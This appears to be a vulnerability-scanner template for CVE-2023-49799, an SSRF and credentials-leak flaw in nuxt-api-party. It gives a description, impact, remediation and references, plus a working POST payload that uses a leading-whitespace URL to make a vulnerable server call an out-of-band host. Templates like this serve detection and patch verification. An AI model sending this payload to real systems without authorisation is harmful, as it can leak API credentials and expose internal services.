id: CVE-2023-49799

info:
  name: nuxt-api-party - SSRF & Credentials Leak via Whitespace Bypass
  author: eeche(Changhyun Lee)
  severity: high
  description: |
    nuxt-api-party allows developers to proxy requests to an API without exposing credentials to the client. This vulnerability allows an attacker to change the baseURL of the request using leading whitespace, potentially leading to credentials being leaked or SSRF.
  impact: |
    The vulnerability allows an attacker to:
    - Leak sensitive API credentials by bypassing URL validation.
    - Perform Server-Side Request Forgery (SSRF) attacks, potentially accessing internal services or resources not intended to be exposed.
  remediation: |
    - Update `nuxt-api-party` to version `0.22.0` or later.
    - Sanitize inputs by removing any leading or trailing HTTP whitespace.
  reference:
    - https://github.com/johannschopplich/nuxt-api-party/security/advisories/GHSA-3wfp-253j-5jxv
    - https://nvd.nist.gov/vuln/detail/CVE-2023-49799
    - https://fetch.spec.whatwg.org/#http-whitespace-byte
    - https://github.com/johannschopplich/nuxt-api-party/commit/72762a200fc19d997a0f84bce578c28698dc5270
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-49799
  tags: cve, cve2023, ssrf, nuxt, credentials-leak, web, oob

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/__api_party/__proto__"
    headers:
      Content-Type: application/json
    body: |
      {
        "path": " https://{{interactsh-url}}"
      }
    redirects: false
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
